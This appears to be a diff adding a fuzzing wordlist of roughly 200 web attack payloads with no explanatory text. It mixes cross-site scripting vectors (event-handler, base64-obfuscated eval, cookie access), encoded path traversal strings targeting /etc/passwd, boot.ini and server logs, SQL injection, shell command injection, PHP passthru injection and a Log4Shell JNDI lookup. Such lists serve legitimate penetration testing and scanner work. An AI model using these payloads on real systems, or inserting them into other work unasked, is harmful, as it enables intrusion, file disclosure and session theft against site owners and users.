@@ -1,0 +1,199 @@
+0: <div draggable="true" contenteditable>drag me</div><pre ondrop=prompt(1) contenteditable>drop here</pre>
+1: ..%u2215windows%u2215system32%u2215drivers%u2215etc%u2215hosts
+2: %f8%80%80%80%ae%f8%80%80%80%ae%uF025%f8%80%80%80%ae%f8%80%80%80%ae%uF025%f8%80%80%80%ae%f8%80%80%80%ae%uF025%f8%80%80%80%ae%f8%80%80%80%ae%uF025%f8%80%80%80%ae%f8%80%80%80%ae%uF025boot.ini
+3: ../../../../../../../../../var/log/mysql.log
+4: %f0%80%80%ae%f0%80%80%ae%c0%af%f0%80%80%ae%f0%80%80%ae%c0%af%f0%80%80%ae%f0%80%80%ae%c0%af%f0%80%80%ae%f0%80%80%ae%c0%afetc%c0%afpasswd
+5: <legend onblur=confirm(1) tabindex=1 id=x></legend><input autofocus>
+6: <pre oncontextmenu="alert(1)">test</pre>
+7: anythinglr00</script><script>alert(document.domain)</script>uxldz
+8: %uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\boot.ini
+9: <embed onclick="alert(1)">test</embed>
+10: <svg onload="javascript:confirm(123)" xmlns="#"></svg>
+11: <frameset onmouseleave="confirm(1)">test</frameset>
+12: <td id=x tabindex=1 onfocusin=alert(1)></td>
+13: %f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9c%f8%80%80%80%ae%f8%80%80%80%ae%c1%9cboot.ini
+14: <optgroup onblur=confirm(1) tabindex=1 id=x></optgroup><input autofocus>
+15: <script>var fn=window[atob('ZXZhbA==')];fn(atob('YWxlcnQoMSk='));    </script>
+16: <html onkeyup="alert(1)" contenteditable>test</html>
+17: <image oncopy="prompt(1)" contenteditable>test</image>
+18: %c0%fe%c0%fe%c1%9c%c0%fe%c0%fe%c1%9c%c0%fe%c0%fe%c1%9cboot.ini
+19: <object id=x onfocus=confirm(1) type=text/html>
+20: <figure id=x tabindex=1 onactivate=prompt(1)></figure>
+21: %f0%80%80%ae%f0%80%80%ae%uF025boot.ini
+22: <i onmouseup="alert(1)">test</i>
+23: %e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216%e0%80%ae%e0%80%ae%u2216boot.ini
+24: ../../../../../../var/log/exim_mainlog
+25: ..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1c..../%c1%1cetc%c1%1cpasswd
+26: ../../../proc/self/fd/12
+27: <select onbeforepaste="prompt(1)" contenteditable>test</select>
+28: <noembed id=x tabindex=1 onfocusin=prompt(1)></noembed>
+29: <bdi draggable="true" ondragleave="prompt(1)">test</bdi>
+30: ; ls -laR /var/www
+31: 0x2e0x2e%e0%80%af0x2e0x2e%e0%80%af0x2e0x2e%e0%80%af0x2e0x2e%e0%80%af0x2e0x2e%e0%80%af0x2e0x2e%e0%80%afwindows%e0%80%afsystem32%e0%80%afdrivers%e0%80%afetc%e0%80%afhosts
+32: ..%01%c1%1c..%01%c1%1c..%01%c1%1cboot.ini
+33: <style>:target {color: red;}</style><article id=x style="transition:color 10s" ontransitioncancel=alert(1)></article>
+34: ....//....//....//windows//system32//drivers//etc//hosts
+35: \../\../etc/passwd
+36: ${passthru(print(`echo XGEVDG`.`echo $((58+30))`.`echo XGEVDG`.`echo XGEVDG`);//XGEVDG
+37: \..%e0%80%af\..%e0%80%af\..%e0%80%af\..%e0%80%af\..%e0%80%afetc%e0%80%afissue
+38: <style>:target {color:red;}</style><basefont id=x style="transition:color 1s" ontransitionend=alert(1)></basefont>
+39: <frameset oncut="confirm(1)" contenteditable>test</frameset>
+40: .//..//.//..//.//..//.//..//etc//passwd
+41: <html ontouchmove=alert(1)>
+42: %e0%80%ae%e0%80%ae%c0%qf%e0%80%ae%e0%80%ae%c0%qf%e0%80%ae%e0%80%ae%c0%qf%e0%80%ae%e0%80%ae%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
+43: <style>:target {transform: rotate(180deg);}</style><xmp id=x style="transition:transform 2s" ontransitionrun=confirm(1)></xmp>
+45: <blink id=x tabindex=1 onbeforedeactivate=prompt(1)></blink><input autofocus>
+46: ?.%c0\?.%c0\?.%c0\?.%c0\?.%c0\windows%c0\system32%c0\drivers%c0\etc%c0\hosts
+47: <ins onmouseover="confirm(1)">test</ins>
+48: <ol draggable="true" ondragstart="confirm(1)">test</ol>
+49: <rt draggable="true" ondragstart="confirm(1)">test</rt>
+50: <strong oncontextmenu="confirm(1)">test</strong>
+51: <embed onclick="prompt(1)">test</embed>
+52: <nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>
+53: ../../../../../boot.ini%00index.html
+54: \..0x2f\..0x2f\..0x2f\..0x2f\..0x2f\..0x2fwindows0x2fsystem320x2fdrivers0x2fetc0x2fhosts
+55: ?.0x5c?.0x5c?.0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
+56: ../../../../var/www/logs/access_log
+57: <style>:target {color: red;}</style><optgroup id=x style="transition:color 10s" ontransitioncancel=alert(1)></optgroup>
+58: <track oncut="prompt(1)" contenteditable>test</track>
+59: <blockquote onkeydown="prompt(1)" contenteditable>test</blockquote>
+60: ..%01%c0\..%01%c0\..%01%c0\..%01%c0\boot.ini
+61: <h1 id=x tabindex=1 ondeactivate=confirm(1)></h1><input id=y autofocus>
+62: .../.%c1%pcboot.ini
+63: <audio onpaste="confirm(1)" contenteditable>test</audio>
+64: 0x2e0x2e%c0%qf0x2e0x2e%c0%qf0x2e0x2e%c0%qf0x2e0x2e%c0%qfetc%c0%qfpasswd
+65: <template onmouseenter="alert(1)">test</template>
+66: %c0%fe%c0%fe%c0/%c0%fe%c0%fe%c0/%c0%fe%c0%fe%c0/%c0%fe%c0%fe%c0/%c0%fe%c0%fe%c0/%c0%fe%c0%fe%c0/windows%c0/system32%c0/drivers%c0/etc%c0/hosts
+67: ??%uEFC8etc%uEFC8issue
+68: .%00.%c1%pc.%00.%c1%pc.%00.%c1%pcboot.ini
+69: .?%c0/.?%c0/.?%c0/etc%c0/issue
+70: <style>:target {color: red;}</style><strong id=x style="transition:color 10s" ontransitioncancel=confirm(1)></strong>
+71: AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--
+72: ../../../../../../../Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php
+73: ../usr/local/etc/pure-ftpd.conf
+74: <blink oncopy="prompt(1)" contenteditable>test</blink>
+75: <svg onmouseleave="confirm(1)">test</svg>
+76: ';;prompt(String.fromCharCode(88,83,83))//\';;prompt(String.fromCharCode(88,83,83))//";;prompt(String.fromCharCode(88,83,83))//";;prompt(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;prompt(String.fromCharCode(88,83,83))<;/SCRIPT>;
+77: <embed src="javascript:alert(1)">
+78: ..%f0%80%80%afetc%f0%80%80%afpasswd
+79: <style>:target {color:red;}</style><font id=x style="transition:color 1s" ontransitionend=confirm(1)></font>
+80: ..%01%u2215..%01%u2215..%01%u2215..%01%u2215..%01%u2215..%01%u2215boot.ini
+81: <noframes onkeyup="confirm(1)" contenteditable>test</noframes>
+82: <strike onkeypress="prompt(1)" contenteditable>test</strike>
+83: %f8%80%80%80%ae%f8%80%80%80%ae%c1%1c%f8%80%80%80%ae%f8%80%80%80%ae%c1%1c%f8%80%80%80%ae%f8%80%80%80%ae%c1%1c%f8%80%80%80%ae%f8%80%80%80%ae%c1%1c%f8%80%80%80%ae%f8%80%80%80%ae%c1%1c%f8%80%80%80%ae%f8%80%80%80%ae%c1%1cboot.ini
+84: ..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%af..../%f8%80%80%80%afetc%f8%80%80%80%afpasswd
+85: <th onmouseover="alert(1)">test</th>
+86: ..%010x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
+87: <fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>
+88: <nav onpaste="prompt(1)" contenteditable>test</nav>
+89: ../../proc/self/fd/21
+90: <details oncopy="prompt(1)" contenteditable>test</details>
+91: <noframes id=x tabindex=1 onfocus=alert(1)></noframes>
+92: <style>@keyframes x{}</style><samp style="animation-name:x" onanimationend="alert(1)"></samp>
+93: ../../../../../../var/log/pure-ftpd/pure-ftpd.log
+94: %f0%80%80%ae%f0%80%80%ae\%f0%80%80%ae%f0%80%80%ae\%f0%80%80%ae%f0%80%80%ae\etc\issue
+95: <rt id=x tabindex=1 ondeactivate=prompt(1)></rt><input id=y autofocus>
+96: %c0%5e%c0%5e\windows\system32\drivers\etc\hosts
+97: %uff0e%uff0e%c0%afboot.ini
+98: <html onmouseup="confirm(1)">test</html>
+99: <meta oncut="confirm(1)" contenteditable>test</meta>
+100: <var id=x tabindex=1 onfocusin=alert(1)></var>
+101: <style>:target {transform: rotate(180deg);}</style><details id=x style="transition:transform 2s" ontransitionrun=alert(1)></details>
+102: <nav onbeforepaste="confirm(1)" contenteditable>test</nav>
+103: ..%uF025..%uF025boot.ini
+104: %c0%fe%c0%fe%c1%pcetc%c1%pcissue
+105: <listing id=x tabindex=1 ondeactivate=confirm(1)></listing><input id=y autofocus>
+106: ../../../../../../../../../../etc/pure-ftpd/pureftpd.pdb
+107: <style>:target {transform: rotate(180deg);}</style><abbr id=x style="transition:transform 2s" ontransitionrun=alert(1)></abbr>
+108: %c0.%c0.\%c0.%c0.\%c0.%c0.\%c0.%c0.\%c0.%c0.\%c0.%c0.\boot.ini
+109: | dir C:\
+110: ?.%c0%af?.%c0%af?.%c0%af?.%c0%af?.%c0%af?.%c0%afetc%c0%afissue
+111: <nextid ondblclick="alert(1)">test</nextid>
+112: ../../../../../../../../../var/log/exim/mainlog
+113: <rb ondblclick="confirm(1)">test</rb>
+114: %f0%80%80%ae%f0%80%80%ae%f8%80%80%80%af%f0%80%80%ae%f0%80%80%ae%f8%80%80%80%af%f0%80%80%ae%f0%80%80%ae%f8%80%80%80%af%f0%80%80%ae%f0%80%80%ae%f8%80%80%80%afboot.ini
+115: 0x2e0x2e%c0%af0x2e0x2e%c0%af0x2e0x2e%c0%af0x2e0x2e%c0%afetc%c0%afissue
+116: <menuitem draggable="true" ondragenter="confirm(1)">test</menuitem>
+117: <body onLoad body onLoad="javascript:javascript:prompt(1)"></body onLoad>
+118: ../../../Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php
+119: <kbd draggable="true" ondragstart="prompt(1)">test</kbd>
+120: <isindex id=x tabindex=1 onfocus=alert(1)></isindex>
+121: <style>:target {color:red;}</style><dd id=x style="transition:color 1s" ontransitionend=alert(1)></dd>
+122: %e0%80%ae%e0%80%ae%f0%80%80%af%e0%80%ae%e0%80%ae%f0%80%80%af%e0%80%ae%e0%80%ae%f0%80%80%af%e0%80%ae%e0%80%ae%f0%80%80%af%e0%80%ae%e0%80%ae%f0%80%80%afetc%f0%80%80%afissue
+123: <col oncontextmenu="prompt(1)">test</col>
+124: <div draggable="true" contenteditable>drag me</div><var ondragover=prompt(1) contenteditable>drop here</var>
+125: 0x2e0x2e%c0\etc%c0\passwd
+126: <video onclick="confirm(1)">test</video>
+127: <div draggable="true" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>
+128: %uff0e%uff0e%c0%af%uff0e%uff0e%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
+129: <svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+130: <bdi onpaste="alert(1)" contenteditable>test</bdi>
+131: <video onmouseover="alert(1)">test</video>
+132: <menuitem onmouseup="prompt(1)">test</menuitem>
+133: <nobr draggable="true" ondragend="confirm(1)">test</nobr>
+134: 0x2e0x2e%e0%80%af0x2e0x2e%e0%80%afetc%e0%80%afissue
+135: ??%u2216??%u2216??%u2216??%u2216??%u2216??%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
+136: <element onclick="confirm(1)">test</element>
+137: \..%c1%8s\..%c1%8s\..%c1%8s\..%c1%8swindows%c1%8ssystem32%c1%8sdrivers%c1%8setc%c1%8shosts
+138: \..%uF025\..%uF025\..%uF025boot.ini
+139: %e0%80%ae%e0%80%ae%bg%qf%e0%80%ae%e0%80%ae%bg%qf%e0%80%ae%e0%80%ae%bg%qf%e0%80%ae%e0%80%ae%bg%qfboot.ini
+140: <wbr onpaste="alert(1)" contenteditable>test</wbr>
+141: <multicol onmouseover="confirm(1)">test</multicol>
+142: %f8%80%80%80%ae%f8%80%80%80%ae%c0%9v%f8%80%80%80%ae%f8%80%80%80%ae%c0%9vboot.ini
+143: <dialog draggable="true" ondragleave="prompt(1)">test</dialog>
+144: <style>:target {color:red;}</style><applet id=x style="transition:color 1s" ontransitionend=prompt(1)></applet>
+145: %c0%5e%c0%5e%c1%af%c0%5e%c0%5e%c1%af%c0%5e%c0%5e%c1%af%c0%5e%c0%5e%c1%afetc%c1%afissue
+146: <dfn draggable="true" ondragend="alert(1)">test</dfn>
+147: ..%01%c0\..%01%c0\etc%c0\issue
+148: ..\..\etc\passwd;index.htm
+149: <del id=x tabindex=1 onbeforeactivate=confirm(1)></del>
+150: %c0%fe%c0%fe%f0%80%80%af%c0%fe%c0%fe%f0%80%80%af%c0%fe%c0%fe%f0%80%80%af%c0%fe%c0%fe%f0%80%80%af%c0%fe%c0%fe%f0%80%80%afetc%f0%80%80%afpasswd
+151: <fieldset onmouseover="prompt(1)">test</fieldset>
+152: <style>@keyframes slidein {}</style><big style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="confirm(1)"></big>
+153: <style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationend="prompt(1)"></plaintext>
+154: .%c0%ae/.%c0%ae/.%c0%ae/etc/issue
+155: <command onmousemove="confirm(1)">test</command>
+156: <applet draggable="true" ondragend="alert(1)">test</applet>
+157: ......///......///......///etc///passwd
+158: .%00.%c1%pc.%00.%c1%pc.%00.%c1%pc.%00.%c1%pc.%00.%c1%pcetc%c1%pcpasswd
+159: <option ondblclick="prompt(1)">test</option>
+160: ..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%af..%01%f8%80%80%80%afwindows%f8%80%80%80%afsystem32%f8%80%80%80%afdrivers%f8%80%80%80%afetc%f8%80%80%80%afhosts
+161: <center draggable="true" ondragstart="confirm(1)">test</center>
+162: foo<script>confirm(document.cookie)</script>
+163: <blockquote onmouseout="alert(1)">test</blockquote>
+164: '1<svg onload=confirm(1)>
+165: ??%c1%afetc%c1%afissue
+166: 0x2e0x2e%f8%80%80%80%af0x2e0x2e%f8%80%80%80%af0x2e0x2e%f8%80%80%80%af0x2e0x2e%f8%80%80%80%af0x2e0x2e%f8%80%80%80%af0x2e0x2e%f8%80%80%80%afboot.ini
+167: ..../%uEFC8..../%uEFC8etc%uEFC8passwd
+168: ..../%e0%80%afetc%e0%80%afpasswd
+169: ..0x5c..0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts
+170: %fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5c%fc%80%80%80%80%ae%fc%80%80%80%80%ae0x5cetc0x5cpasswd
+171: ${jndi:ldap:/${sys:java.vendor}.fake.domain/a}
+172: ../../../usr/local/cpanel/logs/license_log
+173: <area onbeforecut="prompt(1)" contenteditable>test</area>
+174: <hgroup onkeypress="confirm(1)" contenteditable>test</hgroup>
+175: javascript:confirm("hellox worldss")
+176: 0x2e0x2e%c1%pc0x2e0x2e%c1%pc0x2e0x2e%c1%pc0x2e0x2e%c1%pcwindows%c1%pcsystem32%c1%pcdrivers%c1%pcetc%c1%pchosts
+177: <style>:target {color:red;}</style><embed id=x style="transition:color 1s" ontransitionend=prompt(1)></embed>
+178: ></SCRIPT>">'><SCRIPT>prompt(String.fromCharCode(88,83,83))</SCRIPT>
+179: <iframe id=x tabindex=1 onactivate=alert(1)></iframe>
+180: %f0%80%80%ae%f0%80%80%ae%uF025%f0%80%80%ae%f0%80%80%ae%uF025etc%uF025issue
+181: .%00.%c1%afetc%c1%afpasswd
+182: <form oncopy="prompt(1)" contenteditable>test</form>
+183: <style>@keyframes x{}</style><output style="animation-name:x" onanimationend="confirm(1)"></output>
+184: .%00.%bg%qf.%00.%bg%qf.%00.%bg%qf.%00.%bg%qf.%00.%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
+185: <big oncut="confirm(1)" contenteditable>test</big>
+186: ..%010x5cboot.ini
+187: %uff0e%uff0e%f8%80%80%80%af%uff0e%uff0e%f8%80%80%80%af%uff0e%uff0e%f8%80%80%80%af%uff0e%uff0e%f8%80%80%80%af%uff0e%uff0e%f8%80%80%80%afetc%f8%80%80%80%afpasswd
+188: ;%0aecho$IFSZOHJGD$((19+47))$(echo$IFSZOHJGD)ZOHJGD'
+189: <image src=validimage.png onloadstart=confirm(1)>
+190: <tr onkeypress="prompt(1)" contenteditable>test</tr>
+191: <cite draggable="true" ondragend="confirm(1)">test</cite>
+192: %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216windows%u2216system32%u2216drivers%u2216etc%u2216hosts
+193: ')) or sleep(5)='
+194: <style>@keyframes x{}</style><caption style="animation-name:x" onanimationend="confirm(1)"></caption>
+195: <thead onclick="confirm(1)">test</thead>
+196: %f0%80%80%ae%f0%80%80%ae%uF025%f0%80%80%ae%f0%80%80%ae%uF025%f0%80%80%ae%f0%80%80%ae%uF025%f0%80%80%ae%f0%80%80%ae%uF025%f0%80%80%ae%f0%80%80%ae%uF025boot.ini
+197: <textarea onauxclick=prompt(1)>XSS</textarea>
+198: <source onbeforecopy="alert(1)" contenteditable>test</source>
+199: ..%010x2f..%010x2f..%010x2f..%010x2f..%010x2fetc0x2fissue
